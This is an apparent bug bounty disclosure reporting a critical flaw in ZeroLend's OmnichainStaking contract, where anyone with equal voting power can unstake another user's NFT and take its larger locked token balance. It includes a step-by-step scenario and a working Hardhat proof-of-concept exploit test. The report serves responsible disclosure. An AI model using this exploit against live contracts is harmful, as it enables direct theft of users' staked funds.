# 29062 - \[SC - Critical] Attacker can steal locked balance of staked nft...

Submitted on Mar 6th 2024 at 04:05:14 UTC by @MahdiKarimi for [Boost | ZeroLend](https://immunefi.com/bounty/zerolend-boost/)

Report ID: #29062

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/zerolend/governance>

Impacts:

* Direct theft of any user NFTs, whether at-rest or in-motion, other than unclaimed royalties
* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The OmnichainStaking's unstake function allows anyone to unstake any token by just burning associated voting power, since voting power is based on locked balance and lock duration so two different NFTS with different locked balances can have the same amount of power which allows an attacker to exchange an NFT with some locked balance for an NFT with more locked balance and shorter lock duration. The attacker can mint a tokenLocker NFT by locking some tokens for a long duration, stake it at OmnichainStaking to receive voting power, and use minted voting power to Unstake another NFT ( staked by another user ) with more locked balance and shorter lock duration from OmnichainStaking.

## Vulnerability Details

Users can utilize TokenLocker to create a lock by staking a certain amount of Zero tokens for a specified duration. TokenLocker then generates a unique NFT that represents the locked amount and the duration of the lock. Each NFT has a power value, calculated based on the locked amount and duration; more tokens and a longer lock duration contribute to a higher power. Users can stake these NFTs at OmnichainStaking contract and receive voting power proportional to the power of the TokenLocker NFT, OmnichainStaking has an unstakeToken function that allows anyone to unstake a token by burning the amount of voting power associated with that NFT. users can receive the same amount of voting power by locking different amounts of Zero tokens due to different durations, this creates a situation that enables attackers to lock some amount of tokens for a long duration to receive voting power and use that voting power to unstake a tokenLocker NFT with more locked balance and lower lock duration.

Consider the following scenario : 1 - Alice creates a lock with 40 Zero tokens for two years 2 - Alice transfers minted NFT to omnichainStakign to receive voting power 3 - Bob creates a lock with 20 Zero tokens for four years 4 - Alice and Bob would receive the same amount of voting power ( both NFTs have the same power) 5 - Bob Unstakes NFT of Alice from omniChainStaking ( he has enough voting power since both NFTs have minted the same voting power) 6 - Now Bob has an NFT representing 40 tokens locked for two years while he staked 20 tokens for 4 years. 7 - Now Alice is forced to Unstake Bob's NFT which has 20 locked balances and has been locked for 4 years, he lost 20 tokens .

## Impact Details

Attackers can steal the locked balance of other users which is direct theft of funds. Also users can be forced to stake for a longer time.

## References

<https://github.com/zerolend/governance/blob/a30d8bb825306dfae1ec5a5a47658df57fd1189b/contracts/locker/BaseLocker.sol#L147> <https://github.com/zerolend/governance/blob/a30d8bb825306dfae1ec5a5a47658df57fd1189b/contracts/locker/BaseLocker.sol#L112-L116> <https://github.com/zerolend/governance/blob/a30d8bb825306dfae1ec5a5a47658df57fd1189b/contracts/locker/BaseLocker.sol#L362-L364> <https://github.com/zerolend/governance/blob/a30d8bb825306dfae1ec5a5a47658df57fd1189b/contracts/locker/OmnichainStaking.sol#L68-L70> <https://github.com/zerolend/governance/blob/a30d8bb825306dfae1ec5a5a47658df57fd1189b/contracts/locker/OmnichainStaking.sol#L76-L79>

## Proof of Concept

```
  describe("attacker can drain staked amount of tokenLocker", () => {
    it("attacker can drain staked amount of tokenLocker", async function () {

    // impoerted whale address from goverancne deployment 
    // imported time from hardhat-network-helpers 
    // transferred 20 zero token to whale and 40 zero token to ant address during deployment 
    // removed vesting part from beforeEach 

    let fourYearInSeconds = 124416000;
    let twoYearInSeconds = 62208000;

    // attacker (whale) has 20 Zero tokens
    let balanceOfAttackerBefore = await zero.balanceOf(whale);
    expect(balanceOfAttackerBefore).eq(20n * e18);
    
    // Victim (ant) creates a lock with 40 Zero tokens for duration of 2 years 
    // ant transferrs minted nft to OmnichainStaking and receives power 
    zero.connect(ant).approve(locker.target, 40n * e18);
    await locker.connect(ant).createLock(40n * e18, twoYearInSeconds, false);
    await locker.connect(ant)["safeTransferFrom(address,address,uint256)"](ant.address, omniStaking.target, 1);

    // whale creates a lock with 20 Zero tokens but for duration of 4 years 
    // he transferrs minted nft to OmnichainStaking 
    // despite that he has locked half of ant address but due to more lock duration (2 times of ant) he would receive almost same amount of power 
    zero.connect(whale).approve(locker.target, 20n * e18);
    await locker.connect(whale).createLock(20n * e18, fourYearInSeconds, false);
    await locker.connect(whale)["safeTransferFrom(address,address,uint256)"](whale.address, omniStaking.target, 2);

    // we can assert that whale has more power than ant 
    let balanceWhale = await omniStaking.balanceOf(whale.address);
    let balanceAnt = await omniStaking.balanceOf(ant.address);
    expect(balanceWhale).greaterThanOrEqual(balanceAnt);

    // whale can unstake minted nft of ant from tokenLocker since he has enough power 
    // this nft has two times more lockedBalance 
    await omniStaking.connect(whale).unstakeToken(1);

    // after 2 years he can withdraw this token from locker 
    // Now whale has 40 Zero token balance 
    // so ant address should use his voting power to other token with 20 Zero balance and 4 years of lock duration

    await time.increase(twoYearInSeconds);
    await locker.connect(whale).withdraw(1);
    let balanceOfAttacker = await zero.balanceOf(whale);
    expect(balanceOfAttacker).eq(40n * e18);


    });
    
  });
```
